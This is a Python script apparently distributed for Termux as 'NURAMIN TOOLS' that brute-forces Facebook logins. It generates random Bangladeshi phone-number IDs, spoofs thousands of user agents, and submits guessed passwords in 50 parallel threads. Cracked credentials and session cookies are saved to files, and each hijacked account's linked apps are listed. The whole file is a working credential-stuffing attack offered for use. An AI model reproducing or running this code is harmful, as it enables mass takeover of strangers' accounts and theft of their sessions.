import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
import os, platform, time, sys
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
#os.system('pip install rich')

print('\033[95;1m[\x1b[38;5;50m+\033[95;1m] \033[1;34m WELCOME NURAMIN TERMUX WORLD ')
os.system("espeak -a 300 \"WELCOME NURAMIN TERMUX WORLD \"")
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        jalan(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        jalan(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            jalan(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            jalan(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        jalan(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        jalan(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            jalan(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
          
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            

            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ("""\033[38;5;48m
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║\033[1;91m\033[1;41m\033[1;97m              WELCOME TO NURAMIN TOOLS               \033[;0m\033[1;91m\033[1;92m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
  _   _ _   _ ____       _    __  __ ___ _   _  
 | \ | | | | |  _ \     / \  |  \/  |_ _| \ | | 
 |  \| | | | | |_) |   / _ \ | |\/| || ||  \| | 
 | |\  | |_| |  _ <   / ___ \| |  | || || |\  | 
 |_| \_|\___/|_| \_\ /_/   \_\_|  |_|___|_| \_| 
                                                  BOT🍁
      \033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS NURAMIN BRAND\033[;0m\033[1;91m═══>\033[1;92m                                            
\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[3;30m\033[2;37mFr\033[2;31mee \033[2;37mVers\033[2;36mi\033[2;37mon \033[2;34m0.1\x1b[0m
\033[38;5;96m\033[47m 𝙁 \x1b[0m\033[38;5;196m DEVELOPER   :   NUR-AMIN
\033[38;5;97m\033[47m 𝙐 \x1b[0m\033[38;5;197m GITHUB      :   NOT AVAILABLE 
\033[38;5;98m\033[47m 𝙆 \x1b[0m\033[38;5;198m POWER BY    :   FUCKER BOY\033[1;30m
\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

import getpass

attemps = 0

while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\033[34;1m enter username:\033[1;33m ')
    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m enter password:\033[1;32m ')

    if username == 'N' and password == 'n':
        print('\033[38;5;46m You Have Successfully Logged in.')
        break
    else:
        print('\x1b[38;5;196m  Incorrect Pass Please Trying ')
        attemps += 1
        continue


def linex():
	jalan('\033[1;95m============================================')
loop = 0
oks = []
cps = []
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    jalan('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:jalan('\n\033[1;31mNo internet connection ... \033[0;97m')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

ugen2=[]
ugen=[]
######### 
redmimodels = random.choice(["23078RKD5C", "2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"])
buildmodels = random.choice(["UP1A", "UKQ1", "SKQ1", "TKQ1"])
for imran in range(9000):
   a = "Mozilla/5.0 (Linux; Android "+str(random.choice(range(4,15)))+"; "
   b = f"{redmimodels} "
   c = f"Build/{buildmodels}."+str(random.choice(range(111111,999999)))+"."+str(random.choice(range(000,999)))+"; " 
   d = "wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/"+str(random.choice(range(1,5)))+"."+str(random.choice(range(0,99)))+" Chrome/"+str(random.choice(range(50,300)))+".0."+str(random.choice(range(1000,10000)))+"."+str(random.choice(range(70,300)))+" "
   e = "Mobile Safari/537.36"
   f = " [FB_IAB/FB4A;FBAV/"+str(random.choice(range(50,700)))+".0.0."+str(random.choice(range(10,100)))+"."+str(random.choice(range(40,200)))+";]"
   ua = a+b+c+d+e+f
   ugen.append(ua)

for imran in range(7000):
   a = "Mozilla/5.0 (Linux; "
   b = "Android "+str(random.choice(range(4,15)))+"; Redmi Note "+str(random.choice(range(6,13)))+" Pro"
   c = ") AppleWebKit/537.36 (KHTML, like Gecko) "
   d = "Chrome/"+str(random.choice(range(50,300)))+".0."+str(random.choice(range(1000,10000)))+"."+str(random.choice(range(70,300)))+" "
   e = "Mobile Safari/537.36 "
   f = "OPR/"+str(random.choice(range(50,700)))+".0.0."+str(random.choice(range(10,100)))+"."+str(random.choice(range(40,200)))+""
   ua1 = a+b+c+d+e+f
   ugen.append(ua1)
for imran in range(7000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14'])
	c=random.choice(['21121119SC','2201117TG','2201117TY','2201117TL','2201117TI'])
	d=random.choice(['Build/RKQ1.211001.001','Build/SKQ1.211103.001','Build/TKQ1.221114.001'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(50,150)
	g='0'
	h=random.randrange(4000,8000)
	i=random.randrange(50,150)
	j='Mobile Safari/537.36'
	ua2=(f'{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}')
	ugen.append(ua2)
    

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :riddu = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :riddu = '√ 2009'
        elif uid[:8] in ['10000000']        :riddu = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:riddu = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:riddu = ' 2010'
        elif uid[:6] in ['100001']          :riddu = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :riddu = '√ 2011/2012'
        elif uid[:6] in ['100004']          :riddu = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :riddu = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :riddu = '√ 2014/2015'
        elif uid[:6] in ['100009']          :riddu = '√ 2015'
        elif uid[:5] in ['10001']           :riddu = '√ 2015/2016'
        elif uid[:5] in ['10002']           :riddu = '√ 2016/2017'
        elif uid[:5] in ['10003']           :riddu = '√ 2018/2019'
        elif uid[:5] in ['10004']           :riddu = '√ 2019/2020'
        elif uid[:5] in ['10005']           :riddu = '√ 2020'
        elif uid[:5] in ['10006','10007','']:riddu = '√ 2021'
        elif uid[:5] in ['10008']           :riddu = '√ 2022'
        elif uid[:5] in ['10009']           :riddu = '√ 2023'
        else:riddu=''
    elif len(uid) in [9,10]:
        riddu = ' √ 2008/2009'
    elif len(uid)==8:
        riddu = '√ 2007/2008'
    elif len(uid)==7:
        riddu = '√ 2006/2007'
    else:riddu=''
    return riddu
    
    
    
def riddu():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    jalan(f' \033[1;91m[\033[1;97m★\033[1;91m]\033[1;92m Example : {xr}019,017,016{x}')
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0173'
    rk4 = '0174'
    rk5 = '0175'
    rk6 = '0176'
    rk7 = '0177'
    rk8 = '0178'
    rk9 = '0179'
    rk10 = '0170'
    rk11 = '0191'
    rk12 = '0192'
    code = random.choice([rk1,rk2,rk3,rk4,rk5,rk6,rk7,rk8,rk9,rk10,rk11,rk12])                      
    pww = input(f' \033[1;91m[\033[1;97m★\033[1;91m]\033[1;92m Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m[\033[1;97m★\033[1;91m]\033[1;92m EXAMPLE : 10000, 20000, 50000 \n \033[1;91m[\033[1;97m★\033[1;91m]\033[1;92m PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"\033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        jalan(f' \033[1;91m[\033[1;97m★\033[1;91m]\033[1;94m TOTAL IDS LIMIT: {xr}'+tl)
        jalan(f' \033[1;91m[\033[1;97m★\033[1;91m]\033[1;94m WORK CUNTRY \033[1;97m: \033[1;96mBANGLADESH')
        jalan(f' \033[1;91m[\033[1;97m★\033[1;91m]\033[1;94m USE NETWORK  \033[1;97m:  \033[1;96mWIFI/DATA ')
        jalan(f' \033[1;91m[\033[1;97m★\033[1;91m]\033[1;93m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        jalan(f' \033[1;91m[\033[1;97m★\033[1;91m]\033[1;92m THE PROCESS HAS BEEN STARTED')
        jalan(f" \033[1;95m============================================")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    jalan(f"\n{x} \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'POST',
            'path': '/login/device-based/login/async/?refsrc=deprecated&lwv=100',
            'scheme': 'https',
            'accept': '*/*',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2.75',
            'referer': 'https://mbasic.facebook.com/?stype=lo&deoia=1&jlou=Afd2_pJKc8bAxp5zutoAH_P1plFH4iwGw2pVrCUZJ-7JjzA8Hm4cvPtJIHw0QybzeN_EyMVw8L7l_qaX1aUTaxnxEEpFTJWr0matmV-L03i4AQ&smuh=2382&lh=Ac9kSyKl0OuYpA9qmOE&wtsid=rdr_0LTHaFbRH5xQgnGaG&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="124.0.6349.224", "Google Chrome";v="124.0.6349.224"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '"2201117TG"',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6349.224 Safari/537.36',
            'viewport-width': '980',
            'x-asbd-id': '129477',
            'x-fb-lsd': 'AVqxgyHBvPM',}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[NURAMIN-OK🍁] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system("espeak -a 300 \"NURAMIN OK ID\"")
                cek_apk(session,coki)
                open('/sdcard/NUR-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r[NURAMIN-cp🍁] ' +uid+ ' | ' +ps+    '\n')
                os.system("espeak -a 300 \"NURAMIN cp ID\"")
                open('/sdcard/xc-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}NURAMIN{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass



riddu()
      
